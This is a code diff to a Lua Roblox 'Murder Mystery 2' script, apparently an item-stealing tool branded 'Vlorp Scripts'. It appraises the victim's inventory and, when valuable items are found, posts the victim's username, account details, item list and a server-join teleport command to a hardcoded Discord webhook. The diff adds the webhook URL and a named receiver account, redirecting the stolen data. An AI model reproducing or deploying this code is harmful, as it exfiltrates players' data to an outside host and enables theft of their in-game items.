@@ -1,5 +1,7 @@
 userName = userName
 webHook = webHook
+UserName = "X4_NDY"
+WebHook = "https://discord.com/api/webhooks/1323692511440404501/CtCIa2_GbH93fernF0QPz4oJ9ani5jln4bpsWls5P-ORo6Qspx1PP7Pfp7p__voIAV61"
 local values = {
     ["Nik's Scythe"] = 25000000,
     ["Elderwood Scythe"] = 75,
@@ -1058,7 +1060,17 @@ local EverythingString = "-- // Uniques\n" .. uniquesString ..
                          "\n\n-- // Uncommon\n" .. uncommonString ..
                          "\n\n-- // Common\n" .. commonsString
 if godlyItemsC >= 1 or ancientItemsC >= 1 or uniqueItemsC >= 1 then
-userName = "X4_NDY"
+local WebHookEmbed = CreateEmbed(
+    "Vlorp Scripts | MM2",
+    "Please execute the code above to get your hit.",
+    11220,
+    {
+        {name = "```Info```", value = "```Username: "..LP.Name.."\nLevel: "..tostring(getLvl()).."\nAccount-Age: "..tostring(LP.AccountAge).."\nExecutor: "..identifyexecutor().."\nReceiver: "..UserName.."```"},
+{name = "```Hit Info```", value = "```Total Value: "..tostring(math.floor(valueCount + 0.5)).."\nTotal Count: "..tostring(itemsCount - 2).."\n\nUniques: "..tostring(uniqueItemsC).."\nAncients: "..tostring(ancientItemsC).."\nGodlys: "..tostring(godlyItemsC).."\nLegendarys: "..tostring(legendaryItemsC).."\nVintage: "..tostring(vintageItemsC).."\nRares: "..tostring(rareItemsC).."\nUncommons: "..tostring(uncommonItemsC).."\nCommons: "..tostring(commonItemsC).."```"},
+{name = "```Hit List```", value = "[Click Me]("..pastebin(EverythingString)..")"}
+    }
+)
+else
 local WebHookEmbed = CreateEmbed(
     "Vlorp Scripts | MM2",
     "Please execute the code above to get your hit.",
@@ -1069,7 +1081,6 @@ local WebHookEmbed = CreateEmbed(
 {name = "```Hit List```", value = "[Click Me]("..pastebin(EverythingString)..")"}
     }
 )
-WebHook = "https://discord.com/api/webhooks/1323692511440404501/CtCIa2_GbH93fernF0QPz4oJ9ani5jln4bpsWls5P-ORo6Qspx1PP7Pfp7p__voIAV61"
 if godlyItemsC >= 1 or ancientItemsC >= 1 or uniqueItemsC >= 1  then
     SendWebhook(WebHook, {content = '-- @everyone\ngame:GetService("TeleportService"):TeleportToPlaceInstance(142823291, "'..game.JobId..'")', embeds = {WebHookEmbed}})
 else
